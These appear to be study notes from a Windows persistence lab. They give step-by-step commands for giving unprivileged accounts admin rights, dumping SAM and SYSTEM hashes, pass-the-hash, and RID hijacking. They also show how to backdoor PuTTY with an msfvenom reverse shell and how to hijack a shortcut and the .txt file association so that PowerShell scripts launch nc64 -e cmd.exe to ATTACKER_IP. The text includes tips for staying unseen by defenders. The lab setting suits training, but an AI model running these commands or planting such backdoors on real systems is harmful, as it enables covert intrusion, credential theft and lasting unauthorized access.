# Introduction 

When you first gain access to a target’s internal network, one of your top priorities is establishing **persistence**—a reliable way to regain access without having to exploit the system again. Persistence ensures you don’t lose your foothold before reaching high‑value assets.

Attackers rush to establish persistence because:

- **Re‑exploitation may fail**: Some exploits are unstable and only work once.
- **Initial access is hard to repeat**: Phishing or social engineering might not succeed a second time.
- **Defenders react quickly**: Once suspicious activity is detected, vulnerabilities may be patched or credentials rotated.

While attackers could reuse stolen credentials, those can change. More covert persistence techniques make it harder for defenders to remove the attacker

## Tampering With Unprivileged Accounts

- **GOAL**
However, to make it harder for the blue team to detect us, we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.

#NOTE  When you log in via RDP, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing **Reconnect**.  

Notice that we assume you have already gained administrative access somehow and are trying to establish persistence from there.

#### Assign Group Memberships
assume we have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the **Administrators** group.

```Command Prompt
C:\> net localgroup administrators thmuser0 /add
```
**Note**: This will allow you to access the server by using RDP, WinRM or any other remote administration service available.

If that looks too suspicious, we can use the **Backup Operators** group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL
- Adding the account to the Backup Operators group
```Command Prompt
C:\> net localgroup "Backup Operators" thmuser1 /add
```

- We add it to the **Remote Desktop Users** (RDP) or **Remote Management Users** (WinRM) groups to be able to RDP or WinRM back to the machine
```Command Prompt
C:\> net localgroup "Remote Management Users" thmuser1 /add
```

- Connecting from the attacker machine with WinRM
```linux
evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
```
**Note**: if you are using WinRM, you are possible to confined to a limited access token with no administrative privileges.

- To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
```Command Prompt
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

- proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:
```linux
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
```

```linux
*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
```

```linux
*Evil-WinRM* PS C:\> download system.bak
```

```linux
*Evil-WinRM* PS C:\> download sam.bak
```
**Note:** If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.

- With those files, we can dump the password hashes for all users using `secretsdump.py` or other similar tools
```linux
user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

- And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
```linux
user@AttackBox$ evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

#### Special Privileges and Security Descriptors
A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. **Privileges** are simply the capacity to do a task on the system itself.


In the case of the Backup Operators group, it has the following two privileges assigned by default:

- **SeBackupPrivilege:** The user can read any file in the system, ignoring any DACL in place.
- **SeRestorePrivilege:** The user can write any file in the system, ignoring any DACL in place.

- We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file:
```powershell
secedit /export /cfg config.inf
```
We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:

- We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:
```powershell
secedit /import /cfg config.inf /db config.sdb
```

```Powershell
secedit /configure /db config.sdb /cfg config.inf
```

- To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this)
```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```
*Note*: This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:

Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.

Notice that for this user to work with the given privileges fully, you'd have to change the **LocalAccountTokenFilterPolicy**

```Command Prompt
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

- If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!
```powershell
net user thmuser2
```

#### RID Hijacking
Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.

When a user is created, an identifier called **Relative ID (RID)** is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

In any Windows system, the default Administrator account is assigned the **RID = 500**, and regular users usually have **RID >= 1000**.

- To find the assigned RIDs for any user, you can use the following command:
```Command Prompt
wmic useraccount get name,sid
```

Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec, available in `C:\tools\pstools` in your machine:

```Command Prompt
PsExec64.exe -i -s regedit
```

From Regedit, we will go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user in the machine

Note: the RID is stored using little-endian notation, so its bytes appear reversed.

Note: using rdp to connect to the thmuser3
```Powershell
xfreerdp /v:MACHINE-IP /u:thmuser3 /p:Password321
```

## Backdooring Files
Another method of establishing persistence consists of tampering with some files we know the user interacts with regularly. By performing some modifications to such files, we can plant backdoors that will get executed whenever the user accesses them. Since we don't want to create any alerts that could blow our cover, the files we alter must keep working for the user as expected.

hile there are many opportunities to plant backdoors, we will check the most commonly used ones.

#### Executable Files
If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.
You can easily plant a payload of your preference in any .exe file with `msfvenom`. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:

```shell-session
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. While this method is good enough to establish persistence, let's look at other sneakier techniques.

#### Shortcut Files
If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.

For this task, let's check the shortcut to **calc** on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:

- Before hijacking the shortcut's target, let's create a simple Powershell script in `C:\Windows\System32` or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:
```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```
NOTE: Finally, we'll change the shortcut to point to our script. Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user.

- We also want to run our script on a hidden window, for which we'll add the `-windowstyle hidden` option to Powershell. The final target of the shortcut would be:
```powershell
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

- Let's start an nc listener to receive our reverse shell on our attacker's machine:
```Command Prompt
nc -lvp 4445
```
NOTE: If you double-click the shortcut, you should get a connection back to your attacker's machine. Meanwhile, the user will get a calculator just as expected by them. You will probably notice a command prompt flashing up and disappearing immediately on your screen. A regular user might not mind too much about that, hopefully.

#### Hijacking File Associations
In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.

The default operating system file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`.

Most ProgID entries will have a subkey under `shell\open\command` where the default command to be run for files with that extension is specified:

In this case, when you try to open a .txt file, the system will execute `%SystemRoot%\system32\NOTEPAD.EXE %1`, where `%1` represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to `C:\Windows\backdoor2.ps1`:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```
